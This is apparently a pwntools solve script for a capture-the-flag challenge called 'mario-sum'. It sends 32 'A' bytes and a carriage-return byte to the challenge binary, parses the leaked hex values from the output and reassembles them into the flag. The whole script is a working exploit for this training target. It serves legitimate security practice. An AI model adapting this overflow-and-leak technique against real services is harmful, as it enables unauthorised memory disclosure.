from pwn import *
import re

reg = re.compile(r"(46544345.+) =")

if args.REMOTE:
    io = remote("mario-sum.esaip-cyber.com", 55555)
elif args.LOCAL:
    io = remote("localhost", 55555)
else:
    io = process("../src/chall")

def to_hex(h):
    return f"0{h}" if len(h) % 2 == 1 else h

io.sendline(b"A"*32 + b"\x0d")
res = io.recvall(timeout=2)

output = reg.findall(res.decode())[0]

print(output.split(" + "))

flag = b"".join([bytes.fromhex(to_hex(k))[::-1] for k in output.split(" + ")])

print("Flag =", flag)
